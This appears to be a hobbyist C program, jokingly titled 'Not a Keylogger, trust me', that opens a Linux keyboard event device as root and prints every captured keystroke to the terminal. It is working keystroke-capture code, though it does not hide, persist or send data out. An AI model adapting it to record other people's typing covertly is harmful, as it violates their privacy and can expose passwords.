// Not a Keylogger, trust me
//
// This program reads keys from the keyboard buffer
// and displays them on screen.
//
// Usage: sudo ./naktm
// MUST RUN AS SUPERUSER!
// MUST SPECIFY YOUR DEVICE EVENT TO READ FROM.
// SEE COMMENTS AT THE BEGINNING OF MAIN!
//
// for extra fun, run xev from terminal
// ====================================

#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h> // key defines can be found in here
#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include "keymap.h"

int main() {

    // let's be verbose for now to debug our program.
    printf("NaKtm keylogger started.\n");
    fflush(stdout);

    /* char* keyboard hardcoded for now. Future version would
     * scan devices and choose the correct device.
     *
     * Device info is available with the command
     * cat /proc/bus/input/devices
     * Look for the device event associated with the keyboard.
     * for example, I have two keyboards attached. One appears
     * as event3 and the other event 4. */
    char* keyboard = "/dev/input/event3";

    int fd = 0; /* file descriptor */
    int rd; /* number of bytes read */
    unsigned int scancode = 0;

    /* attempt to open the keyboard file */
    if ( (fd = open(keyboard, O_RDONLY)) > 0){
        struct input_event event; /* buffer to hold reads from keyboard */
        printf("Keyboard file opened successfully! \n");

        /* infinite loop to read keystrokes from file. */
        /* read() will block until there is data to read. */
        /* attempting to read the entire input event and store it in event */
        while ( (rd = read(fd, &event, sizeof(struct input_event))) ) {
            fflush(stdout);
            if (event.type == EV_KEY)
                log_keystroke(stdout, event);
        }

    } else {
        fprintf(stderr, "Error: Couldn't open keyboard file -- %s", strerror(errno));
        exit(1);
    }

    return 0;
}
